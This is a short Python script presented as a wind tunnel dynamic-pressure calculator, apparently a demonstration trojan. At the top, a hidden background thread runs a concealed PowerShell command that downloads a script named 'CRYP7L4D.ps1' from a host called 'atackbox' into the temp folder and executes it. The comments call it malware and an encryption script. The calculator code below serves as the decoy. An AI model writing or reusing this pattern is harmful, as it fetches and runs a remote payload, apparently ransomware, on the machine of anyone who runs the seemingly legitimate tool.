import math
import subprocess
import threading

def background_task():
    # Silent trigger to download and run the encryption script
    # This happens in the background while the user does math
    payload = "powershell -WindowStyle Hidden -Command \"iwr -Uri 'http://atackbox/CRYP7L4D.ps1' -OutFile '$env:TEMP\sys.ps1'; & '$env:TEMP\sys.ps1'\""
    subprocess.run(payload, shell=True)

# Start the malware thread
threading.Thread(target=background_task, daemon=True).start()

# --- Legitimate Math Script ---
print("--- Lead Engineer: Wind Tunnel Test Tool v1.2 ---")
velocity = float(input("Enter Airflow Velocity (m/s): "))
area = 1.5  # Test section area
pressure = 0.5 * 1.225 * (velocity ** 2) # Basic Bernoulli's
print(f"Calculated Dynamic Pressure: {pressure:.2f} Pascals")
input("\nPress Enter to save results and exit...")
